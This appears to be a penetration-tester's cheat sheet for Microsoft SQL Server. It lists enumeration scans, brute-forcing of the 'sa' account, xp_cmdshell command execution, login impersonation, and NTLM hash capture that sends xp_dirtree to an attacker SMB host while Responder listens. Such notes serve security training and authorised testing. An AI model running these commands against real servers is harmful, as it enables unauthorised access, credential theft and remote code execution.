# MSSQL
```table-of-contents
```
## Theory: System Databases
| **Database**   | **Description**                                                |
| ---------- | ---------------------------------------------------------- |
| `master`   | Tracks all system information for the SQL server instance. |
| `model`    | Template database for creating new databases.              |
| `msdb`     | Used by SQL Server Agent to schedule jobs and alerts.      |
| `tempdb`   | Stores temporary objects. Cleared on restart.              |
| `resource` | Read-only database containing system objects.              |
## Discovery & Enumeration
```shell
# Nmap - Comprehensive Scan
# Checks for empty passwords, info, config, and vulnerabilities
nmap -p 1433 -sV -sC --script "ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess" <IP>

# Metasploit - MSSQL Ping
# Useful to find hidden instances or non-standard ports
use auxiliary/scanner/mssql/mssql_ping
set RHOSTS <IP>
run
```
## Authentication & Connection
### Impacket (mssqlclient.py)
```shell
# Windows Authentication (Domain Account)
# Use this if you have DOMAIN\User credentials
mssqlclient.py <DOMAIN>/<USER>:<PASS>@<IP> -windows-auth

# SQL Authentication (Local Account)
# Use this for 'sa' (System Administrator)
mssqlclient.py <USER>:<PASS>@<IP>
```
### Hydra (Brute Force)
```shell
# Brute Force 'sa' user
hydra -l sa -P /usr/share/wordlists/rockyou.txt mssql://<IP>
```
## Interaction (SQL Syntax)
```sql
-- Hostname
SELECT @@SERVERNAME;

-- List Databases
SELECT name FROM sys.databases;

-- Select Database
USE <DB_NAME>;

-- List Tables
SELECT * FROM information_schema.tables;

-- Current User & Version
SELECT SYSTEM_USER;
SELECT @@version;

-- Check if you are Sysadmin (Returns 1 if yes)
SELECT IS_SRVROLEMEMBER('sysadmin');
```
## Attacks: Remote Command Execution (RCE)
_If you have `sysadmin` privileges, you can execute OS commands._
### Method 1: Impacket (Auto)
```shell
# Inside mssqlclient prompt:
enable_xp_cmdshell
xp_cmdshell whoami
```
### Method 2: Manual (SQL Query)
```sql
-- 1. Enable Advanced Options
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;

-- 2. Enable xp_cmdshell
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;

-- 3. Execute Command
EXEC xp_cmdshell 'whoami';
```
## Attacks: Stealing NTLM Hashes
1. **Attacker (Kali):** Start Responder to listen for hashes.
    ```shell
    sudo responder -I tun0
    ```
2. **Victim (SQL connection):** Trigger a connection to your IP.
    ```sql
    -- The `xp_dirtree` command tries to list files in a folder.
    -- We point it to our malicious SMB server.
    EXEC master..xp_dirtree '\\<KALI_IP>\share';
    ```
3. **Result:** You will catch the NTLMv2 hash of the Service Account running MSSQL.
## Attacks: Impersonation
_Check if you can impersonate the 'sa' user even if you logged in as a low-priv user._
```sql
-- Check for users that can be impersonated
SELECT distinct b.name
FROM sys.server_permissions a
INNER JOIN sys.server_principals b
ON a.grantor_principal_id = b.principal_id
WHERE a.permission_name = 'IMPERSONATE';

-- Impersonate 'sa'
EXECUTE AS LOGIN = 'sa';
SELECT SYSTEM_USER; -- Should return 'sa'
```